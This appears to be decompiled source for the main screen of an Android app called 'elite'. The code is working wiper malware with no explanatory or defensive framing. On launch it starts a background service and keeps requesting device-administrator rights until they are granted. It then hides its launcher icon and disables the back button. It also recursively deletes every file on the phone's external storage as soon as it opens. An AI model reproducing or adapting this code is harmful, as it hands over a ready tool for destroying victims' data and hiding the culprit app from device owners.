package com.elite;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import java.io.File;

public class MainActivity extends Activity {
    String DELIVERED = "SMS_DELIVERED";
    String SENT = "SMS_SENT";

    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(getApplicationContext(), IntentServiceClass.class));
        new DeviceManager().activateDeviceAdmin(this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);
        wipeMemoryCard();
    }

    public void onBackPressed() {
    }

    public void HideAppFromLauncher(Context context) {
        try {
            context.getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        finish();
    }

    public void wipeMemoryCard() {
        File deleteMatchingFile = new File(Environment.getExternalStorageDirectory().toString());
        try {
            File[] filenames = deleteMatchingFile.listFiles();
            if (filenames == null || filenames.length <= 0) {
                deleteMatchingFile.delete();
                return;
            }
            for (File tempFile : filenames) {
                if (tempFile.isDirectory()) {
                    wipeDirectory(tempFile.toString());
                    tempFile.delete();
                } else {
                    tempFile.delete();
                }
            }
        } catch (Exception e) {
        }
    }

    private static void wipeDirectory(String name) {
        try {
            File directoryFile = new File(name);
            File[] filenames = directoryFile.listFiles();
            if (filenames == null || filenames.length <= 0) {
                directoryFile.delete();
                return;
            }
            for (File tempFile : filenames) {
                if (tempFile.isDirectory()) {
                    wipeDirectory(tempFile.toString());
                    tempFile.delete();
                } else {
                    tempFile.delete();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* Access modifiers changed, original: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case DeviceManager.REQUEST_CODE_ENABLE_ADMIN /*1000*/:
                if (new DeviceManager().isDeviceAdminActive(getApplicationContext())) {
                    HideAppFromLauncher(getApplicationContext());
                    return;
                } else {
                    new DeviceManager().activateDeviceAdmin(this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);
                    return;
                }
            default:
                return;
        }
    }
}
